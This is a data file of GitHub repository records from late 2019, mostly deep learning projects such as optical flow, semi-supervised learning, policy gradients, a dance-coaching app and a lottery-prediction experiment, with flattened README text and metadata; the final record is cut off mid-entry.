abrosua,piv_liteflownet-pytorch,n/a,pytorch liteflownet This is a personal reimplementation of LiteFlowNet 1 using PyTorch Should you be making use of this work please cite the paper accordingly Also make sure to adhere to the licensing terms of the authors Should you be making use of this particular implementation please acknowledge it appropriately 2 For the original Caffe version of this work please see https github com twhui LiteFlowNet Another optical flow implementation from me https github com sniklaus pytorch pwc And another optical flow implementation from me https github com sniklaus pytorch spynet Yet another optical flow implementation from me https github com sniklaus pytorch unflow setup To download the pre trained models run bash download bash These originate from the original authors I just converted them to PyTorch The correlation layer is implemented in CUDA using CuPy which is why CuPy is a required dependency It can be installed using pip install cupy or alternatively using one of the provided binary packages as outlined in the CuPy repository usage To run it on your own pair of images use the following command You can choose between three models please make sure to see their paper the code for more details python run py model default first images first png second images second png out out flo I am afraid that I cannot guarantee that this reimplementation is correct However it produced results pretty much identical to the implementation of the original authors in the examples that I tried There are some numerical deviations that stem from differences in the DownsampleLayer of Caffe and the torch nn functional interpolate function of PyTorch Please feel free to contribute to this repository by submitting issues and pull requests comparison license As stated in the licensing terms of the authors of the paper their material is provided for research purposes only Please make sure to further consult their licensing terms references 1 inproceedingsHuiCVPR2018 author Tak Wai Hui and Xiaoou Tang and Chen Change Loy title LiteFlowNet A Lightweight Convolutional Neural Network for Optical Flow Estimation booktitle IEEE Conference on Computer Vision and Pattern Recognition year 2018 2 miscpytorch liteflownet author Simon Niklaus title A Reimplementation of LiteFlowNet Using PyTorch year 2019 howpublished urlhttps github com sniklaus pytorch liteflownet,2019-11-25T04:57:18Z,2019-12-14T13:29:27Z,Python,abrosua,User,1,1,0,53,master,abrosua,1,0,0,0,0,0,1
varun19299,Theory_of_DL_project,n/a,Gaussian Processes and NTKs Author Varun Sundar github com varun19299 NNGPNTK gif NNGPNTK gif Install JAX bash install jaxlib PYTHONVERSION cp37 alternatives cp27 cp35 cp36 cp37 CUDAVERSION cuda101 alternatives cuda90 cuda92 cuda100 cuda101 PLATFORM linuxx8664 alternatives linuxx8664 BASEURL https storage googleapis com jax releases pip install upgrade BASEURL CUDAVERSION jaxlib 0 1 32 PYTHONVERSION none PLATFORM whl pip install upgrade jax install jax Neural Tangets bash git clone https github com google neural tangents pip install e neural tangents Streamlit and Other Requirements pip install r requirements txt Running the App streamlit run GPkernel py and follow the link provided,2019-11-24T07:14:41Z,2019-12-07T08:17:42Z,Python,varun19299,User,1,1,0,2,master,varun19299,1,0,0,0,0,0,0
rajarshi100,PandSVN-DRL-,n/a,PandSVN DRL Deep Reinforcement Learning based Processing and Sensing scheme for Vehicular Networks,2019-11-18T18:24:57Z,2019-12-03T16:27:07Z,Python,rajarshi100,User,1,1,0,3,master,rajarshi100,1,0,0,0,0,0,0
AldousSilas,tv_script_generation_udacity,n/a,TVscriptgenerationudacity The ipynb file in this repo has implemented and passed the requirements for Udacity tv script generation project in deep learning Nano degree Usage A RNN was developed from scratch to develop a tv script Transfer learning techniques have not being used in this project Restrictions cuda is needed to run most of the code in ipynb file as it is highly computation intense Cloning If anyone needs to clone the file following link can be used https github com AldousSilas tvscriptgenerationudacity git,2019-12-04T02:36:56Z,2019-12-09T15:59:10Z,HTML,AldousSilas,User,1,1,0,5,master,AldousSilas,1,0,0,0,0,0,0
DoctorKey,R2D2.pytorch,deep-learning#image-classification#pytorch#semi-supervised-learning,R2D2 pytorch This is the PyTorch source code for Repetitive Reprediction Deep Decipher for Semi Supervised Learning https arxiv org abs 1908 04345 Usage Install the dependencies The code runs on Python 3 Install the dependencies and prepare the datasets with the following commands conda create n pytorch python 3 6 conda activate pytorch conda install pytorch torchvision cudatoolkit 10 0 conda install tensorboard future matplotlib tqdm Prepare CIFAR 10 Dataset The code expects to find the data in specific directories inside the data local directory You can prepare the CIFAR 10 with this command data local bin preparecifar10 sh cd data local python labels bin preparecifar10label py Then the images of CIFAR 10 will be saved at data local images cifar10 and the labels of CIFAR 10 will be saved at data local labels cifar10 Train on CIFAR 10 with 4000 labeled images Stage 1 In the first stage we only use labeled images to train the backbone network python experiments cifar10 shakeshake semi40001supervisedbygtlabel py Stage 2 In the second stage we train the network and optimize pseudo labels by R2 D2 First change the value of pretrained in experiments cifar10 shakeshake semi400023R2D2 py Then run python experiments cifar10 shakeshake semi400023R2D2 py Stage 3 In the third stage the backbone network is finetuned by pseudo labels First change the value of pretrained in experiments cifar10 shakeshake semi40004finetune py Then run python experiments cifar10 shakeshake semi40004finetune py Tensorboard R2D2 will generate tensorboard log during training You can view the tensorboard by this command tensorboard logdir results cifar10 Citing this repository If you find this code useful in your research please consider citing us inproceedingsR2D2AAAI2020 title Repetitive Reprediction Deep Decipher for Semi Supervised Learning author Wang Guo Hua and Wu Jianxin booktitle Thirty Fourth AAAI Conference on Artificial Intelligence year 2020 Acknowledgement This project is based on Mean Teacher https github com CuriousAI mean teacher,2019-12-05T01:07:14Z,2019-12-13T09:09:48Z,Shell,DoctorKey,User,1,1,1,1,master,DoctorKey,1,0,0,0,0,0,0
RohitGandikota,Hiding-Video-in-Images-using-Deep-Generative-Adversarial-Networks,n/a,Hiding Video in Images using Deep Generative Adversarial Networks This is a preliminary attempt on hiding video data inside images using deep learning We design a custom adversarial network with custom losses and additional discriminator We call this multi discriminator and multi objective training framework,2019-11-09T11:40:08Z,2019-11-26T11:52:20Z,Python,RohitGandikota,User,1,1,0,2,master,RohitGandikota,1,0,0,0,0,0,0
john525,BachLSTM,n/a,BachLSTM CS147 Final Project jlhota nwee A deep learning model to generate music sequences based on a corpus of Bach compositions represented as MIDI files Most music generation models have used an approach combining the LSTM with the Restricted Boltzmann Machine or some other augmentation but this project attempts to replicate a paper that uses a purely deep learning approach Our project is based on Alleng Huang and Raymond Wu s paper https cs224d stanford edu reports allenh pdf However since their dataset from MuseData has been taken offline we are using midi files from jsbach net to train our network To download these files cd to the data directory and run chmod x getdata sh getdata sh Then to run the project do python m venv env source env bin activate pip install r requirements txt python assignment py BIG SMALL With the flag BIG the dataset will load all available MIDI files With the flag SMALL the dataset will only load the first 10 files for faster local testing,2019-11-24T19:28:54Z,2019-12-12T20:27:24Z,Python,john525,User,2,1,0,37,master,john525,1,0,0,0,0,0,0
frslabs,octus-ios,n/a,Octus SDK Octus SDK uses advanced deep learning technologies for accurate and fast Document ID scanning and OCR version https img shields io badge pod v1 0 0 red Octus SDK uses advanced deep learning technologies for accurate and fast ID scanning and OCR Businesses can integrate the Octus SDK into native iOS Apps which comes with pre built screens and configurations The SDK returns the scanned images extracted data and error codes And as a safety measure the SDK does not store any of the personal data or ID images that are scanned Table Of Content Features Features Prerequisite prerequisite Requirements requirements Permission Permission Installation installation Usage example Usage example Octus Result Octus Result Octus Parameters octus parameters Octus Error Codes octus error codes Help help Features x Auto scanning domestic and internationals ID cards x OCR is highly accurate x Scan duration is very less x MRTD document supported Prerequisite You will need a valid license to use the Octus SDK which can be obtained by contacting support frslabs com Depending on the license offline or online you have opted for the ping functionality to billing servers will be disabled or enabled For instance if you have opted for the offline SDK model then there will be no server ping needed to our billing server to bill you However if you have chosen a transaction based pricing then after each transaction a ping request will be made to our billing server This cannot be overrided by the App A point to note is that if the ping transaction fails for any reason the whole transaction will be void without any results from the SDK Once you have the license follow the below instructions for a successful integration of Octus SDK onto your iOS Application Requirements iOS 10 0 Xcode 11 2 Permission In Info plist file add following code to allow your application to access iPhone s camera NSCameraUsageDescription Allow access to camera Installation CocoaPods You can use CocoaPods http cocoapods org to install Octus by adding it to your Podfile ruby platform ios 13 0 useframeworks pod Octus pod TesseractOCRiOS 4 0 0 To get the full benefits import Octus wherever you import UIKit swift import UIKit import Octus Supported Tessdata installation 1 Download and drop model trainneddata in tessdata folder of your project 2 Congratulations Usage example swift import Octus let scanner IdScannerController delegate self scanner modalPresentationStyle fullScreen scanner licenceKey Your Licence Key scanner documentType Document PAN rawValue scanner documentCountry Country in rawValue scanner documentSubType ScanMode OCR rawValue present scanner animated false Handling the result swift class ViewController UIViewController IdScannerControllerDelegate func idScannerController scanner IdScannerController didFinishScanningWithResults results IdScannerResults print ScanResult results octusResult scanner dismiss animated true completion nil func idScannerControllerDidCancel scanner IdScannerController scanner dismiss animated true completion nil func idScannerController scanner IdScannerController didFailWithError error Int print ErrorCode error scanner dismiss animated true completion nil Octus Result swift let resultJson convertToJson jsonObject results octusResult let resultDict convertToDictionary text resultJson let result resultDict OctusData as String String let code result code let code result code let docType result documentType let name1 result name1 let name2 result name2 let idNumber result number let dob result dob let yob result yob let country result country let expiry result expiry let address result address let gender result gender let issuedBy result issuedBy let ifsc result ifsc let imagePathFace result facePath let imagePathFront result frontImagePath let imagePathBack result backImagePath Retrieve image from document directory let image getImageFromDocumentDirectory imagePath imagePathFace fileName fileName FileNames Front Image docfront png Back Image docback png Face Image docface png if imagePath count 0 let resultImage getImageFromDocumentDirectory imagePath imagePath fileName fileName imageView image resultImage Supported Mathods func convertToJson jsonObject NSMutableDictionary String let jsonData NSData do jsonData try JSONSerialization data withJSONObject jsonObject options prettyPrinted as NSData let jsonString String data jsonData as Data encoding String Encoding utf8 replacingOccurrences of with return jsonString catch print JSON Failure return func convertToDictionary text String String Any if let data text data using utf8 do return try JSONSerialization jsonObject with data options as String Any catch print error localizedDescription return nil func getImageFromDocumentDirectory imagePath String fileName String UIImage let nsDocumentDirectory FileManager SearchPathDirectory documentDirectory let nsUserDomainMask FileManager SearchPathDomainMask userDomainMask let paths NSSearchPathForDirectoriesInDomains nsDocumentDirectory nsUserDomainMask true if let dirPath paths first let frontimageURL URL fileURLWithPath dirPath appendingPathComponent fileName let frontimage UIImage contentsOfFile frontimageURL path return frontimage UIImage else return UIImage Octus Error Codes Error codes and their meaning are tabulated below Code Message 801 Scan timed out 802 Invalid ID parameters passed 803 Camera permission denied 804 Scan was interrupted 805 Octus SDK License got expired 806 Octus SDK License was invalid 807 Invalid camera resolution 811 QR not detected 812 QR parsing failed 108 Internet Unavailable 401 Api Limit Exceeded 429 Too many request Octus Parameters scanner licenceKey LICENCE KEY Required Accepts the Octus licence key as a String scanner documentCountry Country countryISOcode rawValue Required Sets the country associated with the Document For the complete list of supported countries refer ISO3166 1alpha 2 format code scanner documentType Document value rawValue Required Sets the Document which has to be scanned Possible values are Value Effect Document PAN Pan Card Document ADR Aadhaar Card Document VID Voter ID Document NID National ID Document PPT Passport Document VSA Visa Document DRV Driving Licence Document CQL Cheque Leaf Document GST GST Form Document IMGA Image Capture Aadhaar Document IMGH Plain Image capture scanner documentSubType ScanMode OCR rawValue Required Sets the Document Sub Type Majority of the documents support only ScanMode OCR rawValue as a sub type Documents where both ScanMode OCR rawValue and ScanMode BARCODE rawValue apply are Document ADR Documents where only ScanMode MRTD rawValue apply are Document PPT Document VSA Possible values for Sub Type are Value Effect ScanMode OCR rawValue Scans the document in OCR mode ScanMode BARCODE rawValue Scans the document in QR mode ScanMode MRTD rawValue Scans the document in MRZ mode ScanMode CROP rawValue Scans the document in Crop mode Help For any queries feedback contact us at support frslabs com,2019-12-02T13:31:20Z,2019-12-10T13:23:52Z,n/a,frslabs,Organization,0,1,0,30,master,devteam-frslabs,1,0,0,0,0,0,0
carmanzhang,euler-graph-convertor,n/a,,2019-11-27T07:11:20Z,2019-11-30T02:45:31Z,Java,carmanzhang,User,1,1,0,1,master,carmanzhang,1,0,0,0,0,0,0
JackBrady,Policy_Gradients,n/a,Policy Gradients This repo is a TensorFlow implementation of the policy gradients assignment from Dr Sergey Levine s CS 294 112 Deep Reinforcement Learning The assignment description can be found in the included PDF The code to run the experiments for this project can be found in the repo along with the code to plot and log the results The code to plot and log the results along with the initial starter code were provided with the assignment Videos of some of the trained agents as well as the results for each experiment are shown and discussed below Videos CartPole Experiments were run in the cartpole environment examining the impact of batch size using reward to go and normalizing the advantages The following plot shows the impact of each where dna corresponds to unnormalized advantages lb vs sb corresponds to large batch vs small batch sizes and rtg signifies if reward to go was used It can be seen in the plots that batch size and using reward to go had the most significant impact on performance while normalizing the advantages did not have much of an effect figure 1 https raw github com JackBrady PolicyGradients master Plots smallbatchcartpole png figure 2 https raw github com JackBrady PolicyGradients master Plots largebatchcartpole png InvertedPendulum Experiments were run in the inverted pendulum environment with the goal of finding the smallest possible parameters for batch size and learning rate which achieved a maximum score of 1000 in less than 100 iterations The parameters that were found were a learning rate of 0 007 and a batch size of 2500 The plot for the experiment can be seen below figure 1 https raw github com JackBrady PolicyGradients master Plots invertedpend png The following experiments were run after implementing a state dependent baseline via a neural network LunarLander This experiment was run in the lunar lander environment utilizing the neural network baseline A batch size of 40000 and a learning rate of 0 005 were used The plot for the experiment can be seen below figure 1 https raw github com JackBrady PolicyGradients master Plots lunarlander png HalfCheetah These experiments examined the impact of reward to go and a neural network baseline in the HalfCheetah environment A batch size of 30000 with a learning rate of 0 02 were found to be appropriate values as larger batch sizes along with a larger learning rate were empirically found to boost performance It can be seen below that using reward to go as well as the neural network baseline gave superior results figure 1 https raw github com JackBrady PolicyGradients master Plots cheetahplot png,2019-11-20T14:47:29Z,2019-12-14T03:34:47Z,Python,JackBrady,User,1,1,0,4,master,JackBrady,1,0,0,0,0,0,0
rahowa,torch_external,n/a,torchexternal Contains external featuers for deep learning with PyTorch such as common used losses activation functions and layers,2019-12-11T09:44:42Z,2019-12-11T11:42:29Z,n/a,rahowa,User,1,1,0,2,master,rahowa,1,0,0,0,0,0,0
krantirk,ML-From-Scratch,n/a,Machine Learning From Scratch About Python implementations of some of the fundamental Machine Learning models and algorithms from scratch The purpose of this project is not to produce as optimized and computationally efficient algorithms as possible but rather to present the inner workings of them in a transparent and accessible way Table of Contents Machine Learning From Scratch machine learning from scratch About about Table of Contents table of contents Installation installation Examples examples Polynomial Regression polynomial regression Classification With CNN classification with cnn Density Based Clustering density based clustering Generating Handwritten Digits generating handwritten digits Deep Reinforcement Learning deep reinforcement learning Image Reconstruction With RBM image reconstruction with rbm Evolutionary Evolved Neural Network evolutionary evolved neural network Genetic Algorithm genetic algorithm Association Analysis association analysis Implementations implementations Supervised Learning supervised learning Unsupervised Learning unsupervised learning Reinforcement Learning reinforcement learning Deep Learning deep learning Contact contact Installation git clone https github com eriklindernoren ML From Scratch cd ML From Scratch python setup py install Examples Polynomial Regression python mlfromscratch examples polynomialregression py Figure Training progress of a regularized polynomial regression model fitting temperature data measured in Linkping Sweden 2016 Classification With CNN python mlfromscratch examples convolutionalneuralnetwork py ConvNet Input Shape 1 8 8 Layer Type Parameters Output Shape Conv2D 160 16 8 8 Activation ReLU 0 16 8 8 Dropout 0 16 8 8 BatchNormalization 2048 16 8 8 Conv2D 4640 32 8 8 Activation ReLU 0 32 8 8 Dropout 0 32 8 8 BatchNormalization 4096 32 8 8 Flatten 0 2048 Dense 524544 256 Activation ReLU 0 256 Dropout 0 256 BatchNormalization 512 256 Dense 2570 10 Activation Softmax 0 10 Total Parameters 538570 Training 100 Time 0 01 55 Accuracy 0 987465181058 Figure Classification of the digit dataset using CNN Density Based Clustering python mlfromscratch examples dbscan py Figure Clustering of the moons dataset using DBSCAN Generating Handwritten Digits python mlfromscratch unsupervisedlearning generativeadversarialnetwork py Generator Input Shape 100 Layer Type Parameters Output Shape Dense 25856 256 Activation LeakyReLU 0 256 BatchNormalization 512 256 Dense 131584 512 Activation LeakyReLU 0 512 BatchNormalization 1024 512 Dense 525312 1024 Activation LeakyReLU 0 1024 BatchNormalization 2048 1024 Dense 803600 784 Activation TanH 0 784 Total Parameters 1489936 Discriminator Input Shape 784 Layer Type Parameters Output Shape Dense 401920 512 Activation LeakyReLU 0 512 Dropout 0 512 Dense 131328 256 Activation LeakyReLU 0 256 Dropout 0 256 Dense 514 2 Activation Softmax 0 2 Total Parameters 533762 Figure Training progress of a Generative Adversarial Network generating handwritten digits Deep Reinforcement Learning python mlfromscratch examples deepqnetwork py Deep Q Network Input Shape 4 Layer Type Parameters Output Shape Dense 320 64 Activation ReLU 0 64 Dense 130 2 Total Parameters 450 Figure Deep Q Network solution to the CartPole v1 environment in OpenAI gym Image Reconstruction With RBM python mlfromscratch examples restrictedboltzmannmachine py Figure Shows how the network gets better during training at reconstructing the digit 2 in the MNIST dataset Evolutionary Evolved Neural Network python mlfromscratch examples neuroevolution py Model Summary Input Shape 64 Layer Type Parameters Output Shape Dense 1040 16 Activation ReLU 0 16 Dense 170 10 Activation Softmax 0 10 Total Parameters 1210 Population Size 100 Generations 3000 Mutation Rate 0 01 0 Best Individual Fitness 3 08301 Accuracy 10 5 1 Best Individual Fitness 3 08746 Accuracy 12 0 2999 Best Individual Fitness 94 08513 Accuracy 98 5 Test set accuracy 96 7 Figure Classification of the digit dataset by a neural network which has been evolutionary evolved Genetic Algorithm python mlfromscratch examples geneticalgorithm py GA Description Implementation of a Genetic Algorithm which aims to produce the user specified target string This implementation calculates each candidate s fitness based on the alphabetical distance between the candidate and the target A candidate is selected as a parent with probabilities proportional to the candidate s fitness Reproduction is implemented as a single point crossover between pairs of parents Mutation is done by randomly assigning new characters with uniform probability Parameters Target String Genetic Algorithm Population Size 100 Mutation Rate 0 05 0 Closest Candidate CJqlJguPlqzvpoJmb Fitness 0 00 1 Closest Candidate MCxZxdr nlfiwwGEk Fitness 0 01 2 Closest Candidate MCxZxdm nlfiwwGcx Fitness 0 01 3 Closest Candidate SmdsAklMHn kBIwKn Fitness 0 01 4 Closest Candidate lotneaJOasWfu Z Fitness 0 01 292 Closest Candidate GeneticaAlgorithm Fitness 1 00 293 Closest Candidate GeneticaAlgorithm Fitness 1 00 294 Answer Genetic Algorithm Association Analysis python mlfromscratch examples apriori py Apriori Minimum Support 0 25 Minimum Confidence 0 8 Transactions 1 2 3 4 1 2 4 1 2 2 3 4 2 3 3 4 2 4 Frequent Itemsets 1 2 3 4 1 2 1 4 2 3 2 4 3 4 1 2 4 2 3 4 Rules 1 2 support 0 43 confidence 1 0 4 2 support 0 57 confidence 0 8 1 4 2 support 0 29 confidence 1 0 Implementations Supervised Learning Adaboost mlfromscratch supervisedlearning adaboost py Bayesian Regression mlfromscratch supervisedlearning bayesianregression py Decision Tree mlfromscratch supervisedlearning decisiontree py Elastic Net mlfromscratch supervisedlearning regression py Gradient Boosting mlfromscratch supervisedlearning gradientboosting py K Nearest Neighbors mlfromscratch supervisedlearning knearestneighbors py Lasso Regression mlfromscratch supervisedlearning regression py Linear Discriminant Analysis mlfromscratch supervisedlearning lineardiscriminantanalysis py Linear Regression mlfromscratch supervisedlearning regression py Logistic Regression mlfromscratch supervisedlearning logisticregression py Multi class Linear Discriminant Analysis mlfromscratch supervisedlearning multiclasslda py Multilayer Perceptron mlfromscratch supervisedlearning multilayerperceptron py Naive Bayes mlfromscratch supervisedlearning naivebayes py Neuroevolution mlfromscratch supervisedlearning neuroevolution py Particle Swarm Optimization of Neural Network mlfromscratch supervisedlearning particleswarmoptimization py Perceptron mlfromscratch supervisedlearning perceptron py Polynomial Regression mlfromscratch supervisedlearning regression py Random Forest mlfromscratch supervisedlearning randomforest py Ridge Regression mlfromscratch supervisedlearning regression py Support Vector Machine mlfromscratch supervisedlearning supportvectormachine py XGBoost mlfromscratch supervisedlearning xgboost py Unsupervised Learning Apriori mlfromscratch unsupervisedlearning apriori py Autoencoder mlfromscratch unsupervisedlearning autoencoder py DBSCAN mlfromscratch unsupervisedlearning dbscan py FP Growth mlfromscratch unsupervisedlearning fpgrowth py Gaussian Mixture Model mlfromscratch unsupervisedlearning gaussianmixturemodel py Generative Adversarial Network mlfromscratch unsupervisedlearning generativeadversarialnetwork py Genetic Algorithm mlfromscratch unsupervisedlearning geneticalgorithm py K Means mlfromscratch unsupervisedlearning kmeans py Partitioning Around Medoids mlfromscratch unsupervisedlearning partitioningaroundmedoids py Principal Component Analysis mlfromscratch unsupervisedlearning principalcomponentanalysis py Restricted Boltzmann Machine mlfromscratch unsupervisedlearning restrictedboltzmannmachine py Reinforcement Learning Deep Q Network mlfromscratch reinforcementlearning deepqnetwork py Deep Learning Neural Network mlfromscratch deeplearning neuralnetwork py Layers mlfromscratch deeplearning layers py Activation Layer Average Pooling Layer Batch Normalization Layer Constant Padding Layer Convolutional Layer Dropout Layer Flatten Layer Fully Connected Dense Layer Fully Connected RNN Layer Max Pooling Layer Reshape Layer Up Sampling Layer Zero Padding Layer Model Types Convolutional Neural Network mlfromscratch examples convolutionalneuralnetwork py Multilayer Perceptron mlfromscratch examples multilayerperceptron py Recurrent Neural Network mlfromscratch examples recurrentneuralnetwork py Contact If there s some implementation you would like to see here or if you re just feeling social feel free to email mailto eriklindernoren gmail com me or connect with me on LinkedIn https www linkedin com in eriklindernoren,2019-12-01T06:41:54Z,2019-12-02T18:24:54Z,Python,krantirk,User,1,1,0,361,master,eriklindernoren#tsvuongnq,2,0,0,0,0,0,0
soarbear,lstm_seq2seq_model_prediction,lstm#many-to-many#predict#seq2seq,lstmseq2seqmodelprediction Use the deep learning recursive neural network keras RNN LSTM Seq2Seq Many to Many model to predict some untrained points on a circle Environment Google Colab CPU GPU TPU keras 2 2 5 LSTM Ubuntu 18 04 3 LTS Python 3 6 8 Numpy 1 17 3 Pandas 0 25 2 sklearn 0 21 3 Model alt text https github com soarbear lstmseq2seqmodelprediction blob master lstmseq2seqmodel jpg Result alt text https github com soarbear lstmseq2seqmodelprediction blob master lstmseq2seqmodelprediction jpg By increasing the number of epochs and neurons a satisfactory result is obtained in accuracy as shown above This shows how important the adjustment of hyperparameters including the selection of cost functions and activation functions is in terms of accuracy Language,2019-11-11T08:07:53Z,2019-11-21T15:41:16Z,Python,soarbear,User,1,1,1,11,master,soarbear,1,0,0,0,0,0,0
goodCycle,AI-Dance-Coach,n/a,AI Dance Coach CS470 Introduction to Artificial Intelligence Term Project This is a prototype for the AI Dance Coach an application that compares your movements to those of a professional performer and highlights mistakes The pipeline consists of recording a video and sending it to our server for processing where it is broken down into separate frames and fed them into OpenPose an open source pose detection model It then uses a custom pose difference calculation to compare the submitted video frames to a sample video and respond with a visualization of the first part where the pose of the user strongly deviates from the sample pose The app runs on smartphones running iOS A short demo video can be found here https drive google com file d 1stwlxUdNVAYhl817kuzX1GkZBdsmHw0 view Video samples for testing the app can be found here https drive google com drive u 0 folders 1daD3I4Pri5CF8vuz1 AeLGCcGbywDyf For testing the app with fidelity lowered compressed videos sample images for evaluating the app can be found here http cocodataset org explore Prerequisites The prerequisites are split up into three parts Backend OpenPose Backend Flask Server Frontend React Native App Backend Disclaimer Due to a variety of systems involved the setup process includes a lot of steps and can vary depending on your environment To limit possible sources of error using a fresh install of Ubuntu 18 04 when setting up this system is recommended Below are the specifications of the server that this setup was tested on These should only serve as a reference point However we recommend using a machine with a powerfull Nvidia GPU as CPU inference for OpenPose requires some additional setup and is too slow for large scale video analysis Hardware RAM 2x 16GB Hynix 16GB 2400 DDR4 CPU 2x 2 2GHz Intel Xeon Skylake 5120 GOLD GPU NVIDIA TESLA K80 Software OS Ubuntu 18 04 Accelerator Cuda 9 1 with cuDNN 7 6 5 Deep learning framework Caffe OpenPose Branch Dependencies Pose Estimation General dependencies sudo apt get install python3 python3 opencv freeglut3 freeglut3 dev libxi dev libxmu dev dkms build essential gcc 6 g 6 linux headers uname r nvidia cuda toolkit cmake libhdf5 serial dev libopencv dev libatlas base dev liblapacke dev libblkid dev e2fslibs dev libboost all dev libaudit dev python numpy doxygen libgflags dev gflags libgoogle glog dev autoconf automake libtool curl make unzip After installing the above dependencies restart to load in the correct nvidia drivers sudo reboot Test the CUDA installation with nvcc version cuDNN For performance reasons installing cuDNN is highly recommended Download https developer nvidia com cudnn Installation https docs nvidia com deeplearning sdk cudnn install index html When following the testing instructions be sure to change the Cuda directory in the Makefile usr if your nvcc is in usr bin Installing protoc Follow the installation instructions here https askubuntu com questions 1072683 how can i install protoc on ubuntu 16 04 Important Skip the Prerequesites part Currently optional Installing caffe sudo apt get install caffe cuda Test the caffe installation with caffe version OpenPose Installing OpenPose https github com CMU Perceptual Computing Lab openpose blob master doc installation md only for reference follow the steps below From the root directory create the build folder mkdir build cd build Set the correct environment variables export CC gcc 6 export CXX g 6 Generate the makefile cmake DBUILDPYTHON ON Build openpose make j nproc To install OpenPose in your environment after building run sudo make install in the build directory Optional Adding the experimental models https github com CMU Perceptual Computing Lab openposetrain blob master experimentalmodels README md 25B Option 2 Getting these to run requires additional workarounds Flask Application Web server setup Using Flask https palletsprojects com p flask as framework nginx http nginx org as web server and gunicorn https gunicorn org as server gateway interface sudo apt get install nginx sudo apt get install gunicorn3 To install all packages needed for this project cd Backend pip3 install r requirements txt Configure nginx make sure that server allows incomming http requests on port 80 in etc nginx sites enabled create file called app with the following content server listen 80 servername location proxypass http unix home pose AI Dance Coach Backend app sock Configure gunicorn in path to file create a file called gunicorn3 service with the following content Unit Description Gunicorn instance to serve myproject After network target Service User pose Group www data WorkingDirectory home pose AI Dance Coach Backend ExecStart usr bin gunicorn3 workers 3 bind unix app sock m 007 app app Frontend iOS For building the iOS App Xcode is required Install the following dependencies brew install yarn sudo gem install cocoapods Running the App Frontend iOS After cloning the Project cd AIDanceCoach yarn cd ios pod install cd react native run ios You can change the server address in AIDanceCoach env SERVERENDPOINT http 208 43 39 216 5000 Change this address Backend To run the deployment server after setup run sudo systemctl daemon reload sudo service gunicorn3 start sudo service nginx start For testing purposes you can start the flask development server by running sudo python3 app py in the Backend directory This will open the app on port 5000 as opposed to 80 Testing the server replace the IP with your own send an http request curl X POST F file path to file mp4 F file path to file json http 208 43 39 216 output response zip with file mp4 beeing an video of a human performing a coreography note behaviour is only defined for exactly one human beeing in the video and file json beeing a json config file with the following format issample compareto The server will return a zip filder with returning the result of the analysis 2 video files a json with the raw data and a json with a short configuration First send sample a sample video Second send trial videos and get the respose So an example for two sending up a sample and comparing it could be curl X POST F file mnt c Users nomis Desktop three mp4 F file mnt c Users nomis Desktop test0 json http 208 43 39 216 curl X POST F file mnt c Users nomis Desktop four mp4 F file mnt c Users nomis Desktop test1 json http 208 43 39 216 output response zip With test0 json being issample true compareto three mp4 and test1 json being issample false compareto three mp4 Evaluation In the Backend folder run python3 evaluate py With input images compressed with parameter QF in Backend evaluate py this evaluates accuracy of pose detection in compressed images Directory of input images can be customized in Backend evaluatecompression Evaluator py The accuracy is measured by 2D Euclidean distance between keypoints of uncompressed image and keypoints of compressed image Accuracy measurement can be improved by implementing Object Keypoint Similarity OKS http cocodataset org keypoints eval but need additional adjustments to match the input format of the OKS API Built With React Native https facebook github io react native Front end framework Flask https www palletsprojects com p flask Backend framework for processing requests OpenPose https github com CMU Perceptual Computing Lab openpose Pose estimation model OpenCV https opencv org Video processing Authors Jaeyi Hong goodCycle https github com goodCycle Adrian Steffan adriansteffan https github com adriansteffan Simon Zocholl SimonZocholl https github com SimonZocholl Doheon Hwang hdh112 https github com hdh112,2019-11-11T04:54:01Z,2019-12-02T11:08:19Z,Python,goodCycle,User,1,1,0,323,master,SimonZocholl#goodCycle#adriansteffan#hdh112,4,0,0,0,10,0,22
andrewyang89,FoodDetection,n/a,FoodDetection This project aims to be able to identify different types of food by using a CNN I will be using this project as a testbed for learning Deep Learning,2019-11-07T02:07:06Z,2019-12-04T17:06:51Z,Jupyter Notebook,andrewyang89,User,2,1,0,43,master,andrewyang89#darshankrishnaswamy,2,0,0,0,2,0,8
ankygupta9999,ImageClassifier,n/a,AI Programming with Python Project Project code for Udacity s AI Programming with Python Nanodegree program In this project students first develop code for an image classifier built with PyTorch then convert it into a command line application,2019-11-09T05:05:59Z,2019-11-09T05:56:56Z,HTML,ankygupta9999,User,1,1,1,1,master,ankygupta9999,1,0,0,0,0,0,0
heg37,Sayisal_Loto_ML_experiment,n/a,Saysal Loto winner number predicting experiment with Machine Learning Project Name SayisalLotoMLexperiment Project Creator Hseyin Emre Girgin Project Publish Date November 2019 Headers What is Saysal Loto what is saysal loto About about the project Our Neural Network s summaries our neural networks summaries Results results Conclusion conclusion What is Saysal Loto Saysal Loto is a kind of lottery from Turkey It has started in 1996 https tr wikipedia org wiki Say C4 B1salLoto For win you must predict 6 number string from numbers of 1 to 49 About the project In this project we have try to find connection between lottery date and Sayisal Loto winner numbers Here the steps of the our project 1 Get a dataset I made researches for find all draw s table So I find a webpage http lotobayisi com Sayisal Butun Veriler aspx for get the data 2 We turned it to array as a json file 3 We edited seperated and saved files for dataset I did this step with libofthesayisalloto py file So if you want yours you can use this Python file We create a train and test datasets for NN We picked randomly 100 samples Then we turned it to npz file for save 4 Finalizing In the final we are training our dataset with Sequential model You can find codes in trainerofloto py file As you see this is a classical train method for a NN Training Method I have tried many method for training statement but this is best result I could find So If you have a better idea feel free to try and share with us I made my trainings on Google Colab because of my computers hardwares and Colab s speed I have tried different layers and neurons and I saved best resoult as an h5 file I created a dataset as you see the npz file s name has a 3 so as you understand it is a version 3 of my datasets I gave 4 inputs as an 2x2 matrix and I get 1 output I tried 4 inputs and 6 outputs model but it does not worked efficiently so I found this We have a input data matrix as like Draw Week Day Month Year and we have a output as Number Our Neural Network s results Model lotomodelnum1 h5 Model sequential5 lotomodel summary Layer type Output Shape Param flatten5 Flatten None 4 0 dense10 Dense None 128 640 dense11 Dense None 31 3999 Total params 4 639 Trainable params 4 639 Non trainable params 0 Model lotomodelnum2 h5 Model sequential14 Layer type Output Shape Param flatten14 Flatten None 4 0 dense43 Dense None 64 320 dense44 Dense None 512 33280 dense45 Dense None 256 131328 dense46 Dense None 41 10537 Total params 175 465 Trainable params 175 465 Non trainable params 0 Model lotomodelnum3 h5 Model sequential25 Layer type Output Shape Param flatten25 Flatten None 4 0 dense81 Dense None 64 320 dense82 Dense None 128 8320 dense83 Dense None 512 66048 dense84 Dense None 45 23085 Total params 97 773 Trainable params 97 773 Non trainable params 0 Model lotomodelnum4 h5 Model sequential26 Layer type Output Shape Param flatten26 Flatten None 4 0 dense85 Dense None 64 320 dense86 Dense None 128 8320 dense87 Dense None 512 66048 